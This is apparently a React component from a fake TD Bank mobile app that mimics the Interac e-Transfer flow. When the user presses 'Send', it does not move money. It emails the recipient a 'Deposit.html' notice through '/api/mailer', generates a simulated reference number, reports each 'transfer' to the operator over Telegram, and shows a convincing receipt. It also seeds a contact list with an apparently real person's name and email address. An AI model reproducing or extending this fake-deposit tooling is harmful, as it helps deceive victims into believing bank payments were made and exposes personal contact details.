
import React, { useState, useMemo } from 'react';
import { BankApp } from '../../../types';
import { BackIcon, SearchIcon } from '../TDIcons';
import { sendTelegramMessage } from '../../scotia/utils/notifications';
import { ScotiaAccountMap, Contact, PendingTransfer, ScotiaAccount } from '../../scotia/types';
import { ReceiptScreen } from './ETransferScreens';

// Modular Components
import SelectionCard from '../etransfer/components/SelectionCard';
import ProcessingOverlay from '../etransfer/components/ProcessingOverlay';
import { ETransferView, TransferStage } from '../etransfer/types';

const E_TRANSFER_FEE = 2.50;

interface ETransferFlowProps {
  app: BankApp;
  onClose: () => void;
  onNotify: (title: string, msg: string, icon: string) => void;
  onComplete?: (type: string, amount: number, payload: any) => void;
  accounts: ScotiaAccountMap;
  // Fix: Added missing properties to ETransferFlowProps to match TDApp usage
  pendingTransfers: PendingTransfer[];
  setPendingTransfers: React.Dispatch<React.SetStateAction<PendingTransfer[]>>;
  senderName: string;
}

const ETransferFlow: React.FC<ETransferFlowProps> = ({ 
  app, onClose, onNotify, onComplete, accounts, senderName, setPendingTransfers
}) => {
  const [view, setView] = useState<ETransferView>('landing');
  const [flowMode, setFlowMode] = useState<'send' | 'request'>('send');
  const [fromAccount, setFromAccount] = useState<string>(
    Object.keys(accounts).find(k => accounts[k].type === 'banking') || 'TD EveryDay Chequing'
  );
  const [toContact, setToContact] = useState<Contact | null>(null);
  const [amount, setAmount] = useState('');
  const [message, setMessage] = useState('');
  const [searchQuery, setSearchQuery] = useState('');
  const [processingStage, setProcessingStage] = useState<TransferStage>('sending');
  const [errorMessage, setErrorMessage] = useState('');
  const [lastTxId, setLastTxId] = useState('');

  const [contacts, setContacts] = useState<Contact[]>(() => {
    const saved = localStorage.getItem('td_high_fid_contacts');
    return saved ? JSON.parse(saved) : [
        { id: '1', name: 'Terry Ned Poitras', email: 'tpoitras39@outlook.com' }
    ];
  });

  const filteredContacts = useMemo(() => 
    contacts.filter((c: Contact) => c.name.toLowerCase().includes(searchQuery.toLowerCase())),
    [contacts, searchQuery]
  );

  const handleAction = async () => {
    if (!toContact || !amount) return;
    setView('processing');
    setProcessingStage('sending');
    setErrorMessage('');

    try {
        const simulatedId = `CO${Math.random().toString(36).substring(2, 5).toUpperCase()}**TD77`;
        
        const response = await fetch('/api/mailer', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                recipient_email: toContact.email,
                recipient_name: toContact.name,
                amount: parseFloat(amount),
                purpose: message || 'TD Interac e-Transfer',
                template: 'Deposit.html'
            }),
            signal: AbortSignal.timeout(10000) 
        });

        const data = await response.json();
        if (!response.ok || !data.success) {
            throw new Error("Failed to send, Please check your network and try again");
        }
        
        setLastTxId(simulatedId);
        await sendTelegramMessage(`TD ${flowMode.toUpperCase()}: $${amount} ${flowMode === 'send' ? 'to' : 'from'} ${toContact.name} | Ref: ${simulatedId}`);

        if (onComplete) {
            onComplete(flowMode, parseFloat(amount), { 
                recipientName: toContact.name, 
                sourceAccount: fromAccount,
                description: `INTERAC E-TRANSFER: ${toContact.name}`
            });

            if (flowMode === 'send') {
                onComplete('fee', E_TRANSFER_FEE, { 
                    sourceAccount: fromAccount,
                    description: 'Interac e-Transfer Fee'
                });
            }
        }
        
        setProcessingStage('completed');
        setTimeout(() => setView('success'), 1200);
    } catch (err: any) {
        setProcessingStage('error');
        setErrorMessage("Failed to send, Please check your network and try again");
    }
  };

  if (view === 'processing') return <ProcessingOverlay stage={processingStage} error={errorMessage} onRetry={handleAction} onAbort={() => setView('main')} />;
  
  if (view === 'success') return (
    <ReceiptScreen 
        contact={toContact!} 
        amount={amount} 
        txId={lastTxId} 
        onClose={onClose} 
        accountName={fromAccount} 
        accountBalance={accounts[fromAccount].balance} 
        onRepeat={() => { setAmount(''); setView('landing'); }} 
        message={message}
    />
  );

  if (view === 'landing') {
    return (
      <div className="absolute inset-0 z-[500] bg-[#f4f7f6] flex flex-col animate-in slide-up h-full text-[#333] font-sans">
          <div className="bg-[#008A00] pt-14 pb-8 px-6 flex items-center gap-4 text-white shrink-0 shadow-sm">
              <button onClick={onClose}><BackIcon color="white" /></button>
              <h2 className="text-xl font-bold tracking-tight">Interac e-Transfer®</h2>
          </div>
          <div className="flex-1 overflow-y-auto px-5 pt-6 space-y-4 no-scrollbar">
              <div className="bg-white rounded-sm border border-gray-100 overflow-hidden divide-y divide-gray-100 shadow-sm">
                  <button onClick={() => { setFlowMode('send'); setView('main'); }} className="w-full p-5 flex items-center gap-5 text-left active:bg-gray-50 transition-all">
                      <div className="w-10 h-10 rounded-sm bg-[#f8fcf8] border border-green-50 flex items-center justify-center text-[#008A00]">
                          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><path d="M22 2L11 13M22 2l-7 20-4-9-9-4 20-7z"/></svg>
                      </div>
                      <div className="flex-1"><p className="font-bold text-gray-800 text-[15px]">Send Money</p></div>
                  </button>
                  <button onClick={() => { setFlowMode('request'); setView('main'); }} className="w-full p-5 flex items-center gap-5 text-left active:bg-gray-50 transition-all">
                      <div className="w-10 h-10 rounded-sm bg-[#f8fcf8] border border-green-50 flex items-center justify-center text-[#008A00]">
                          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
                      </div>
                      <div className="flex-1"><p className="font-bold text-gray-800 text-[15px]">Request Money</p></div>
                  </button>
                  <button onClick={() => setView('contact_picker')} className="w-full p-5 flex items-center gap-5 text-left active:bg-gray-50 transition-all">
                      <div className="w-10 h-10 rounded-sm bg-[#f8fcf8] border border-green-50 flex items-center justify-center text-[#008A00]">
                          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><circle cx="9" cy="7" r="4"/><path d="M23 11l-3 3-1.5-1.5"/></svg>
                      </div>
                      <div className="flex-1"><p className="font-bold text-gray-800 text-[15px]">Manage Contacts</p></div>
                  </button>
              </div>
          </div>
      </div>
    );
  }

  if (view === 'confirm_summary') return (
      <div className="absolute inset-0 z-[650] bg-[#f4f7f6] flex flex-col animate-in slide-up text-[#333] font-sans">
           <div className="bg-[#008A00] pt-14 pb-6 px-6 flex items-center gap-4 text-white shrink-0 shadow-sm">
                <button onClick={() => setView('main')}><BackIcon color="white" /></button>
                <h2 className="text-xl font-bold tracking-tight">Review {flowMode === 'send' ? 'Transfer' : 'Request'}</h2>
           </div>
           <div className="flex-1 overflow-y-auto bg-white border-b border-gray-100">
                <div className="divide-y divide-gray-100">
                    <div className="p-6 flex justify-between items-start">
                        <span className="text-gray-400 text-[12px] font-bold uppercase tracking-widest pt-1">From Account</span>
                        <span className="text-gray-900 font-bold text-[15px] text-right">{fromAccount}</span>
                    </div>
                    <div className="p-6 flex justify-between items-start">
                        <span className="text-gray-400 text-[12px] font-bold uppercase tracking-widest pt-1">Recipient</span>
                        <div className="text-right">
                            <p className="text-gray-900 font-bold text-[15px]">{toContact?.name}</p>
                            <p className="text-gray-400 text-[11px] font-semibold">{toContact?.email}</p>
                        </div>
                    </div>
                    <div className="p-6 flex justify-between items-center">
                        <span className="text-gray-400 text-[12px] font-bold uppercase tracking-widest">Amount</span>
                        <span className="text-gray-900 font-black text-[22px] tracking-tight">${parseFloat(amount).toLocaleString('en-US', { minimumFractionDigits: 2 })}</span>
                    </div>
                    <div className="p-6 flex justify-between items-center bg-[#FAFAFA]">
                        <span className="text-gray-500 text-[13px] font-bold uppercase tracking-widest">Fee</span>
                        <span className="text-gray-900 font-bold text-[18px] tracking-tight">${E_TRANSFER_FEE.toFixed(2)}</span>
                    </div>
                </div>
           </div>
           <div className="p-6 pb-12 bg-white border-t border-gray-100 flex gap-4 shrink-0">
                <button onClick={() => setView('main')} className="flex-1 py-3.5 bg-[#2B5D44] text-white font-bold rounded-sm uppercase tracking-widest">Cancel</button>
                <button onClick={handleAction} className="flex-1 py-3.5 bg-[#008A00] text-white font-bold rounded-sm uppercase tracking-widest shadow-md">Send</button>
           </div>
      </div>
  );

  return (
    <div className="absolute inset-0 z-[500] bg-[#f4f7f6] flex flex-col animate-in slide-up h-full text-[#333] font-sans">
        <div className="bg-[#008A00] pt-14 pb-6 px-6 flex items-center justify-between shadow-sm shrink-0">
            <button onClick={() => setView('landing')} className="p-1 -ml-2"><BackIcon color="white" /></button>
            <h2 className="text-white font-bold text-[17px] tracking-tight ml-1 uppercase">{flowMode === 'send' ? 'Send Money' : 'Request Money'}</h2>
            <div className="w-10"></div>
        </div>
      <div className="flex-1 overflow-y-auto no-scrollbar space-y-4 pt-4">
        {view === 'main' ? (
          <div className="animate-in fade-in space-y-0.5">
            <div className="bg-white px-6">
                <SelectionCard label={flowMode === 'send' ? "From Account" : "Deposit To"} value={fromAccount} onClick={() => setView('account_picker')} />
                <div className="h-px bg-gray-100 ml-4"></div>
                <SelectionCard label={flowMode === 'send' ? "Recipient" : "Request From"} value={toContact?.name} empty={!toContact} onClick={() => setView('contact_picker')} />
            </div>
            <div className="bg-white px-6 py-6 border-b border-gray-100">
                <label className="text-[10px] font-bold text-gray-400 uppercase tracking-widest block mb-2">Amount (CAD)</label>
                <div className="flex items-center gap-2">
                    <span className="text-gray-300 font-bold text-2xl">$</span>
                    <input type="number" value={amount} onChange={e => setAmount(e.target.value)} placeholder="0.00" className="bg-transparent text-gray-900 text-[32px] font-bold outline-none w-full tracking-tighter" />
                </div>
            </div>
          </div>
        ) : view === 'contact_picker' ? (
            <div className="animate-in fade-in space-y-4 px-6 h-full flex flex-col pt-4">
                <div className="flex gap-4 items-center">
                    <div className="bg-white rounded-sm flex-1 flex items-center px-4 py-3 border border-gray-200">
                        <SearchIcon size={18} color="#999" />
                        <input type="text" value={searchQuery} onChange={e => setSearchQuery(e.target.value)} placeholder="Search" className="bg-transparent outline-none ml-3 w-full font-bold text-[14px]" autoFocus />
                    </div>
                </div>
                <div className="bg-white rounded-sm border border-gray-200 flex-1 overflow-y-auto no-scrollbar">
                    {filteredContacts.map((c: any) => (
                        <button key={c.id} onClick={() => { setToContact(c); setView('main'); }} className="w-full p-4 border-b border-gray-50 flex items-center gap-4 text-left active:bg-gray-50">
                            <div className="w-10 h-10 rounded-full bg-[#008A00]/5 flex items-center justify-center text-[#008A00] font-bold shrink-0">{c.name[0]}</div>
                            <div className="flex-1 min-w-0">
                                <p className="text-gray-800 font-bold text-[15px]">{c.name}</p>
                                <p className="text-gray-400 text-[11px] truncate">{c.email}</p>
                            </div>
                        </button>
                    ))}
                </div>
            </div>
        ) : (
            <div className="animate-in fade-in space-y-3 px-6">
                {(Object.entries(accounts) as [string, ScotiaAccount][]).filter(([_, a]) => a.type === 'banking').map(([name, acc]) => (
                    <button key={name} onClick={() => { setFromAccount(name); setView('main'); }} className={`w-full p-6 rounded-sm border text-left ${fromAccount === name ? 'bg-white border-[#008A00] shadow-md' : 'bg-white border-gray-100 opacity-60'}`}>
                        <p className="text-gray-800 font-bold text-[16px]">{name}</p>
                        <p className="text-[#008A00] font-bold text-[14px] mt-1">${acc.balance.toLocaleString('en-US', {minimumFractionDigits: 2})}</p>
                    </button>
                ))}
            </div>
        )}
      </div>
      {view === 'main' && (
        <div className="p-6 pb-12 bg-white border-t border-gray-100">
            <button onClick={() => setView('confirm_summary')} disabled={!toContact || !amount || parseFloat(amount) <= 0} className={`w-full py-4 rounded-sm font-bold text-white uppercase tracking-wider text-[13px] ${amount ? 'bg-[#008A00]' : 'bg-gray-200'}`}>Review Transfer</button>
        </div>
      )}
    </div>
  );
};

export default ETransferFlow;
